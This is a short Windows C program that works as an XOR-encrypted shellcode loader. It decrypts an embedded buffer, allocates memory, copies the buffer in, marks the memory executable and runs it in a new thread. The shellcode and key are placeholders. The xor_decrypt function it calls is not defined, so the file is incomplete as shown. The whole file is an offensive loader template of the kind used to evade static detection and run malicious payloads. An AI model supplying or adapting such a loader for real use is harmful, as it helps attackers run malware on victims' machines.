#include <stdio.h>
#include <windows.h>
#include <time.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

int main() {
    unsigned char shellcode[] = "shellcode";

    size_t shellcode_size = sizeof(shellcode) - 1;
    unsigned char key[] = "keyhere";
    size_t key_size = sizeof(key) - 1;
    DWORD old_protect;
    DWORD change_protect;

    xor_decrypt(shellcode, shellcode_size, key, key_size);
    void* execute_memory;

    // VirtualAlloc
    execute_memory = VirtualAlloc(
        NULL,
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (execute_memory == NULL) {
        warn("Failed to allocate memory %d\n", GetLastError());
        return 1;
    }

    // RtlMoveMemory
    RtlMoveMemory(
        execute_memory,
        shellcode,
        shellcode_size
    );

    okay("Memory allocated at: %p\n", execute_memory);

    // VirtualProtect
    change_protect = VirtualProtect(
        execute_memory,
        shellcode_size,
        PAGE_EXECUTE_READ,
        &old_protect
    );

    if (change_protect == 0) {
        warn("Failed to change memory permissions %d\n", GetLastError());
        return 1;
    }

    okay("Memory protection changed to EXECUTE_READ");

    // CreateThread
    HANDLE thread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)execute_memory,
        NULL,
        0,
        NULL
    );

    if (thread == NULL) {
        warn("CreateThread failed with error %d\n", GetLastError());
        return 1;
    }

    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);

    return EXIT_SUCCESS;
}
